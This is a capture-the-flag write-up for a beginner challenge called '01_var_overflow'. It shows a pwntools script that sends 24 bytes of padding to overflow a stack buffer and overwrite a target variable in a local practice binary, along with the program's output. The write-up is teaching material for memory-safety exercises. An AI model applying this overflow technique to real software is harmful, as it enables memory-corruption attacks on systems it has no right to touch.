# 01_var_overflow Writeup

## Steps:
1. Run chall and notice input starts writing at the first memory address displayed
```
$ ./chall                

Your goal is to modify the variable @ 0x7fff46ec69e8

0x7fff46ec69d0: 0x0000000000000000 0x0000000000000000 
0x7fff46ec69e0: 0xffffffffffffffff 0x00000000deadbeef 

Enter input: AAAA

0x7fff46ec69d0: 0x0000000a41414141 0x0000000000000000 
0x7fff46ec69e0: 0xffffffffffffffff 0x00000000deadbeef 

You failed to modify the target variable...
Maybe you didn't supply enough input? Try again!
```

2. Determine the distance to the target variable ~ 3 sets of 8 bytes = `24` bytes
3. Create the payload ~ 24 bytes of garbage to reach target variable
```
from pwn import *

target = process("./chall")

payload = b"A"*24

target.sendline(payload)

s = target.recvall().decode()
print(s)
```

## Solution:
```
$ python3 exploit.py  
[+] Starting local process './chall': pid 139487
[+] Receiving all data: Done (426B)
[*] Process './chall' stopped with exit code 0 (pid 139487)

Your goal is to modify the variable @ 0x7ffc4147fcb8

0x7ffc4147fca0: 0x0000000000000000 0x0000000000000000 
0x7ffc4147fcb0: 0xffffffffffffffff 0x00000000deadbeef 

Enter input: 
0x7ffc4147fca0: 0x4141414141414141 0x4141414141414141 
0x7ffc4147fcb0: 0x4141414141414141 0x00000000dead000a 

Congrats! You modified the target variable!
```
